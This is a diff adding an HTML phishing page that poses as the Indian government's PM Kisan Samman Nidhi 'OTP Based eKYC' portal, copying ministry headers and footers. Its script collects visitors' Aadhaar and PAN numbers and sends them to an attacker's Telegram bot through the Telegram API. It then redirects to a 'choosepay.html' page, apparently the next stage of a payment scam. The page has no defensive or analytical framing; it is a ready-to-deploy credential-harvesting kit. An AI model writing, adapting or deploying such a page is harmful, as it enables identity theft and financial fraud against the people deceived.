@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Based eKYC</title>
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.css"/>
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick-theme.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/datepicker/1.0.10/datepicker.min.css">
+    <style>
+        /* Top Header Styles */
+        .top-header {
+            background-color: white;
+            color: black;
+            padding: 10px 15px;
+            text-align: center;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .top-header h2 {
+            margin: 0;
+            font-size: 1.2rem;
+            font-weight: bold;
+        }
+
+        .top-header p {
+            margin: 5px 0;
+            font-size: 0.9rem;
+        }
+
+        .top-header a {
+            color: #1565c0;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        .top-header a:hover {
+            text-decoration: underline;
+        }
+
+        /* General Styles */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f4f7;
+        }
+
+        /* Header Section */
+        .header {
+            background-color: #1565c0;
+            color: white;
+            padding: 10px 15px;
+            text-align: center;
+        }
+
+        .header h1 {
+            margin: 0;
+            font-size: 1.5rem;
+        }
+
+        .header p {
+            margin: 10px 0;
+            font-size: 0.9rem;
+        }
+
+        /* Left Image and Header Section */
+        .left-image-section {
+            display: flex;
+            align-items: center;
+            padding: 15px;
+            background-color: #1565c0;
+        }
+
+        .left-image-section img {
+            max-height: 100px;
+            margin-right: 20px;
+        }
+
+        .left-image-section-text {
+            color: white;
+        }
+
+        /* Main Content Section */
+        .main-content {
+            padding: 15px;
+        }
+
+        /* Form Section */
+        .ekyc-form {
+            background-color: #ffffff;
+            padding: 25px;
+            border-radius: 10px;
+            width: 40%;
+            margin: 20px auto;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .ekyc-form input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 1rem;
+        }
+
+        .ekyc-form input:focus {
+            border-color: #1565c0;
+            outline: none;
+        }
+
+        .ekyc-form button {
+            background-color: #1565c0;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 1rem;
+            transition: background-color 0.3s ease;
+        }
+
+        .ekyc-form button:hover {
+            background-color: #0044cc;
+        }
+
+        /* Cache Number Display */
+        .cache-number {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #1565c0;
+            margin: 10px 0;
+        }
+
+        /* Footer Section */
+        .footer {
+            background-color: rgb(0, 0, 0);
+            color: white;
+            padding: 15px;
+            text-align: center;
+        }
+
+        .footer-links {
+            margin-bottom: 10px;
+        }
+
+        .footer-links a {
+            color: white;
+            text-decoration: none;
+            font-size: 0.8rem;
+            margin: 0 5px;
+        }
+
+        .footer-text p {
+            font-size: 0.8rem;
+            margin: 5px 0;
+        }
+
+        .copyright p {
+            font-size: 0.8rem;
+            margin: 5px 0;
+        }
+
+        .mid-banner img {
+            max-width: 50%;
+            height: auto;
+            margin: 0 auto;
+            display: block;
+        }
+
+        /* Responsive Design for Mobile */
+        @media (max-width: 768px) {
+            .ekyc-form {
+                width: 80%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Top Header -->
+    <div class="top-header">
+        <h2>भारत सरकार | GOVERNMENT OF INDIA</h2>
+        <p>कृषि और किसान कल्याण मंत्रालय | MINISTRY OF AGRICULTURE & FARMERS WELFARE</p>
+        <a href="#main-content">Skip to Main Content</a>
+    </div>
+
+    <!-- Header Section -->
+    <header class="header">
+        <div class="left-image-section">
+            <img src="1image2.png" alt="PM Kisan Logo">
+            <div class="left-image-section-text">
+                <h1>PM Kisan Samman Nidhi</h1>
+                <p>Department of Agriculture and Farmers Welfare<br>Ministry of Agriculture and Farmers Welfare<br>Government of India</p>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content Section -->
+    <main class="main-content" id="main-content">
+        <div class="ekyc-form">
+            <h3>OTP Based eKYC Form</h3>
+            <form id="ekycForm" action="#" method="POST">
+                <!-- Aadhar Card Field -->
+                <input type="text" id="aadhar" name="aadhar" placeholder="Enter Your Aadhar Card Number (12 digits)" required maxlength="12"><br>
+
+                <!-- PAN Card Field -->
+                <input type="text" id="pan" name="pan" placeholder="Enter Your PAN Card Number" required maxlength="10"><br>
+
+                <!-- Cache Number Display -->
+                <div class="cache-number" id="cacheNumber"></div>
+
+                <!-- Next Button -->
+                <button type="submit" id="nextButton">Next</button>
+            </form>
+        </div>
+    </main>
+
+    <!-- Footer Section -->
+    <footer class="footer">
+        <div class="mid-banner">
+            <img src="footer2.jpg" alt="Government of India Ministry of Agriculture Banner">
+        </div>
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#disclaimer">Disclaimer</a> | 
+                <a href="#terms">Terms and Conditions</a> | 
+                <a href="#privacy">Privacy Policy</a> | 
+                <a href="#copyright">Copyright Policy</a> | 
+                <a href="#linking">Hyperlinking Policy</a> | 
+                <a href="#accessibility">Accessibility</a>
+            </div>
+            <div class="footer-text">
+                <p>Privacy Policy For Mobile App</p>
+                <p>Site is designed and hosted by National Informatics Centre. Contents published and managed by Department of Agriculture, Cooperation & Farmers Welfare, Ministry of Agriculture and Farmers Welfare, Government of India.</p>
+                <p>Page Last Updated on : 09/02/2025</p>
+            </div>
+            <div class="mid-banner">
+                <img src="footer3.jpg" alt="Government of India Ministry of Agriculture Banner">
+            </div>
+            <div class="copyright">
+                <p>&copy; 2023 PM KISAN Samman Nidhi. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Generate Random Cache Number
+        function generateCacheNumber() {
+            const randomNumber = Math.floor(100000 + Math.random() * 900000); // 6-digit random number
+            const cacheNumberElement = document.getElementById('cacheNumber');
+            cacheNumberElement.textContent = `Cache Number: ${randomNumber}`;
+            cacheNumberElement.style.color = `#${Math.floor(Math.random() * 16777215).toString(16)}`; // Random color
+        }
+
+        // Initialize Cache Number on Page Load
+        generateCacheNumber();
+
+        // Form Submission Handler
+        document.getElementById('ekycForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // Prevent default form submission
+
+            // Validate Aadhar Card Number (Exactly 12 digits)
+            const aadhar = document.getElementById('aadhar').value;
+            const aadharRegex = /^\d{12}$/; // 12 digits
+            if (!aadharRegex.test(aadhar)) {
+                alert('Please enter a valid 12-digit Aadhar number 🆔');
+                return;
+            }
+
+            // Validate PAN Card Number (10 characters, alphanumeric)
+            const pan = document.getElementById('pan').value;
+            const panRegex = /^[A-Z]{5}\d{4}[A-Z]{1}$/; // PAN format
+            if (!panRegex.test(pan)) {
+                alert('Please enter a valid PAN number 📄');
+                return;
+            }
+
+            // Prepare Data to Send to Telegram Bot
+            const botToken = 'YOUR_BOT_API_TOKEN'; // Replace with your bot token
+            const chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
+            const message = `Aadhar: ${aadhar}\nPAN: ${pan}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            // Send Data to Telegram Bot
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    // Redirect to choosepay.html
+                    window.location.href = 'choosepay.html';
+                })
+                .catch(error => {
+                    alert('Something went wrong! Please try again. ❌');
+                });
+        });
+    </script>
+</body>
+</html>
